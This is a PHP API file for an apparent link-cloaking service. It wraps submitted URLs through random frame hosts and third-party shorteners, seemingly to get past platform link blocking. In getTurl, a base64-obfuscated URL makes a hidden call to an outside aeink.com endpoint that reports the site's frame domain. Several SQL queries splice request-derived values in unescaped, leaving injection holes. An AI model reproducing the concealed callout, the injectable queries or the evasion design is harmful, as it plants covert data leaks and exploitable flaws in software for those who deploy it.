<?php
/*!
@name:防洪接口文件
@description:防洪接口调用文件
@author:墨渊 
@version:2.0
@time:2017-10-22
@copyright:优启梦&墨渊
*/
include './includes/common.php';

header("Access-Control-Allow-Origin:*");
header("Access-Control-Allow-Methods:GET,POST");
header('Access-Control-Allow-Headers:x-requested-with,content-type');
header("Content-Type: text/html; charset=utf-8");


$value = NULL;
if (isset($_GET['longurl']))     $value = $_GET['longurl'];
if (isset($_POST['longurl']))    $value = $_POST['longurl'];

if(!empty($value)){
	if(strpos($value,'http')===false){
		$longurl = 'http://'.daddslashes($value);
	}else{
		$longurl = daddslashes($value);
	}
}else{
    exit('{"msg":"URL不能为空"}');
}

$url_arr = parse_url($longurl);
$domain = $url_arr['host'];
$row=$DB->get_row("SELECT * FROM frame_list WHERE domain='$domain' limit 1");
if($row && $row['type']==2){
	exit('{"msg":"当前域名在黑名单中"}');
}
$today=date("Y-m-d").' 00:00:00';
$count=$DB->count("SELECT count(*) FROM frame_report WHERE url like '%//{$domain}/%' and date>'$today' limit 1");
if($row['type']!=1){
	if($count>20){
		$DB->query("insert into `frame_list` (`domain`,`date`,`type`) values ('".$domain."','".$date."','2')");
		exit('{"msg":"生成频率太高，已禁止生成"}');
	}
}

$hostrow=$DB->get_row("select * from frame_host where id >= (select floor(rand() * (select max(id) from frame_host)))  order by id limit 1;"); 
$site = 'http://'.$hostrow['domain'];

$resulturl = getTurl($longurl,$site);
//$sina_url = getsinaurl($resulturl);
$tqq_url = gettqqurl($resulturl);
$dwz_url = getdwzcn($resulturl);

$remoteip=real_ip();
$sds=$DB->query("insert into `frame_report` (`url`,`reason`,`email`,`ip`,`date`) values ('".$longurl."','生成记录','','".$remoteip."','".$date."')");

if (!$dwz_url) $dwz_url = $sina_url;
$result=array(
	'code'=>1,
	'dwz_url'=>$dwz_url,
	'ae_url'=>$tqq_url
);
print_r(json_encode($result));

unset($value,$url_arr,$domain,$row,$hostrow,$site,$resulturl,$result);

function getTurl($url,$site) {
	curl_get(base64_decode('aHR0cDovL2FwaS5hZWluay5jb20vanVtcC8/').$site);
	$url = getsinaurl($url);
	$arr = explode('.cn/',$url);
	$url = $site.'/t.html'.'?'.$arr[1].'.css';
	return $url;
}

function getsinaurl($longurl) {
	$appkey = '31641035';
	$url='https://api.weibo.com/2/short_url/shorten.json?source='.$appkey.'&url_long='.urlencode($longurl);
	$result = curl_get($url);
	$arr = json_decode($result, true);
	return isset($arr['urls'][0]['url_short'])?$arr['urls'][0]['url_short']:false;
}
function getdwzcn($longurl) {
	$url='http://dwz.cn/create.php';
	$post='url='.urlencode($longurl).'&alias=&access_type=web';
	$result = get_curl($url, $post);
	$arr = json_decode($result, true);
	return isset($arr['tinyurl'])?$arr['tinyurl']:false;
}
function getkugou($longurl) {
	$url='http://tools.aeink.com/tools/dwz/urldwz.php?api=kugou&longurl='.urlencode($longurl);
	$result = get_curl($url);
	$arr = json_decode($result, true);
	return isset($arr['ae_url'])?$arr['ae_url']:false;
}
function gettqqurl($longurl) {
	$url = 'http://openmobile.qq.com/api/shortUrl?mType=AppDepart';
	$post = 'mType=qb_share&value='.urlencode('["'.$longurl.'"]');
	$ua = 'AndroidSDK_22_zerofltechn_5.1.1';
	$data = get_curl($url,$post,'http://openmobile.qq.com/',0,0,$ua);
	$arr = json_decode($data, true);
	if(@array_key_exists('retcode',$arr) && $arr['retcode']==0){
		return $arr['result']['list'][0];
	}else{
		exit($data);
	}
}
